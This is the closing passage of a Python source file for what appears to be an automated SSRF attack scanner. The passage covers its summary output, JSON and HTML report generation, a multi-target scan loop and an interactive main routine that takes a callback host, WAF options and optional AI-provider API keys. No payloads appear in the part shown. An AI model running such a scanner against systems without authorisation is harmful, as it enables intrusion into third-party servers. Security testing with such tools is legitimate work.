        print(f"  WAF: {self.waf_info.get('primary', 'None')}")
        print(f"  Endpoints: {len(self.endpoints)}")
        print(f"  Findings: {len(self.evidence)} raw / {len(deduped)} unique")
        print(f"  Callbacks: {len(self.callbacks)}")
        
        if deduped:
            print(f"\n  {BOLD}Vulnerable:{RESET}")
            for (ep, param), info in list(deduped.items())[:10]:
                col = {"critical": RED, "high": YELLOW, "medium": MAGENTA}.get(info["max_sev"], BLUE)
                print(f"  {col}[{info['max_sev'].upper()}]{RESET} {ep} → {param} ({info['oob']} callbacks)")
        
        print(f"\n  {DIM}Report: {self.report_file}{RESET}")
        print(f"  {DIM}Results: {self.results_file}{RESET}")
    
    async def save_results(self):
        """Save JSON results"""
        data = {
            "target": self.target,
            "time": datetime.now().isoformat(),
            "waf": self.waf_info,
            "endpoints": [{"path": e.path, "method": e.method, "params": list(e.params)} for e in self.endpoints],
            "findings": [asdict(f) for f in self.evidence],
            "callbacks": dict(self.callbacks)
        }
        
        with open(self.results_file, "w") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
    
    async def generate_report(self):
        """Generate HTML report"""
        if not JINJA2_AVAILABLE:
            return
        
        template = Template("""
<!DOCTYPE html>
<html>
<head>
    <title>SSRF Report - {{ target }}</title>
    <style>
        body { font-family: Arial; background: #1a1a2e; color: #eee; padding: 20px; }
        .header { background: linear-gradient(135deg, #667eea, #764ba2); padding: 30px; border-radius: 10px; margin-bottom: 20px; }
        .card { background: #16213e; padding: 20px; border-radius: 10px; margin: 10px 0; }
        .critical { color: #ff4444; }
        .high { color: #ff8c00; }
        .medium { color: #ffd700; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #0f3460; padding: 10px; text-align: left; }
        td { padding: 8px; border-bottom: 1px solid #333; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 12px; }
        .badge-critical { background: #ff4444; }
        .badge-high { background: #ff8c00; }
    </style>
</head>
<body>
    <div class="header">
        <h1>SSRF Scan Report</h1>
        <p>Target: <strong>{{ target }}</strong></p>
        <p>Date: {{ date }}</p>
    </div>
    
    <div class="card">
        <h2>Summary</h2>
        <p>WAF: <strong>{{ waf }}</strong></p>
        <p>Endpoints: {{ endpoints }}</p>
        <p>Findings: {{ findings }}</p>
        <p>Callbacks: {{ callbacks }}</p>
    </div>
    
    <div class="card">
        <h2>Vulnerabilities</h2>
        <table>
            <tr><th>Endpoint</th><th>Parameter</th><th>Severity</th><th>Callbacks</th></tr>
            {% for v in vulns %}
            <tr>
                <td>{{ v.endpoint }}</td>
                <td>{{ v.param }}</td>
                <td><span class="badge badge-{{ v.severity }}">{{ v.severity.upper() }}</span></td>
                <td>{{ v.oob }}</td>
            </tr>
            {% endfor %}
        </table>
    </div>
</body>
</html>
        """)
        
        deduped = self.deduplicate()
        vulns = [
            {"endpoint": ep, "param": param, "severity": info["max_sev"], "oob": info["oob"]}
            for (ep, param), info in deduped.items()
        ]
        
        html = template.render(
            target=self.target,
            date=datetime.now().strftime("%Y-%m-%d %H:%M"),
            waf=self.waf_info.get("primary", "None detected"),
            endpoints=len(self.endpoints),
            findings=len(self.evidence),
            callbacks=len(self.callbacks),
            vulns=vulns
        )
        
        with open(self.report_file, "w") as f:
            f.write(html)


# ==================== MAIN ====================
async def scan_targets(targets: List[str], args: argparse.Namespace):
    """Scan multiple targets"""
    all_results = []
    
    for i, target in enumerate(targets, 1):
        print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}]{RESET} Scanning: {target}")
        print(f"{DIM}{'─' * 40}{RESET}")
        
        arsenal = UltimateSSRFArsenal(
            target=target,
            callback=args.callback,
            delay=args.delay,
            verbose=not args.quiet,
            headless=not args.visible,
            ai_provider=args.ai_provider,
            ai_key=args.ai_key,
            ai_model=args.ai_model,
            enable_waf=not args.no_waf
        )
        
        await arsenal.run_full_scan()
        
        all_results.append({
            "target": target,
            "findings": len(arsenal.evidence),
            "endpoints": len(arsenal.endpoints),
            "callbacks": len(arsenal.callbacks),
            "waf": arsenal.waf_info.get("primary", "None"),
            "results_file": arsenal.results_file,
            "report_file": arsenal.report_file
        })
        
        if i < len(targets):
            print(f"\n{DIM}Waiting 5 seconds before next target...{RESET}")
            await asyncio.sleep(5)
    
    if len(targets) > 1:
        print(f"\n{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"{BOLD}{GREEN}  CONSOLIDATED SUMMARY - {len(targets)} TARGETS{RESET}")
        print(f"{BOLD}{GREEN}{'='*50}{RESET}")
        
        total_findings = sum(r["findings"] for r in all_results)
        total_callbacks = sum(r["callbacks"] for r in all_results)
        
        for r in all_results:
            print(f"\n  {BOLD}{r['target']}{RESET}")
            print(f"    WAF: {r['waf']}")
            print(f"    Findings: {r['findings']} | Callbacks: {r['callbacks']}")
        
        print(f"\n  {BOLD}Total:{RESET} {total_findings} findings, {total_callbacks} callbacks")


async def main():
    """Main entry point with proper argparse"""
    parser = setup_argparse()
    args = parser.parse_args()
    
    print(BANNER)
    
    # Get targets
    targets = TargetManager.from_args(args)
    
    # Interactive mode if no targets from CLI
    if not targets:
        targets = TargetManager.interactive_select()
        
        if not targets:
            print(f"{FAIL} No targets provided")
            return
        
        # Get additional options interactively
        args.callback = input(f"{WARN} Callback host [optional]: ").strip() or None
        
        use_ai = input(f"{WARN} Enable AI? (none/claude/openai/ollama/gemini/mistral/deepseek) [none]: ").strip().lower()
        if use_ai and use_ai != "none":
            args.ai_provider = use_ai
            if use_ai != "ollama":
                args.ai_key = input(f"{WARN} API key: ").strip()
        
        delay_input = input(f"{WARN} Delay [0.5]: ").strip()
        args.delay = float(delay_input) if delay_input else 0.5
        
        args.quiet = False
    
    if not targets:
        print(f"{FAIL} No targets to scan")
        return
    
    # Show configuration
    print(f"\n{BOLD}{CYAN}SCAN CONFIGURATION{RESET}")
    print(f"{DIM}{'─' * 40}{RESET}")
    print(f"  Targets: {len(targets)} domain(s)")
    for t in targets[:10]:
        print(f"    • {t}")
    if len(targets) > 10:
        print(f"    ... and {len(targets) - 10} more")
    print(f"  Callback: {args.callback or 'Not configured'}")
    print(f"  Delay: {args.delay}s")
    print(f"  AI: {args.ai_provider or 'Disabled'}")
    print(f"  WAF: {'Disabled' if args.no_waf else 'Enabled'}")
    print(f"  Mode: {'Quiet' if args.quiet else 'Verbose'}")
    print(f"{DIM}{'─' * 40}{RESET}")
    
    # Confirm
    if not args.quiet:
        confirm = input(f"\n{WARN} Start scan? [Y/n]: ").strip().lower()
        if confirm == 'n':
            print(f"{WARN} Scan cancelled")
            return
    
    # Run
    await scan_targets(targets, args)


if __name__ == "__main__":
    asyncio.run(main())
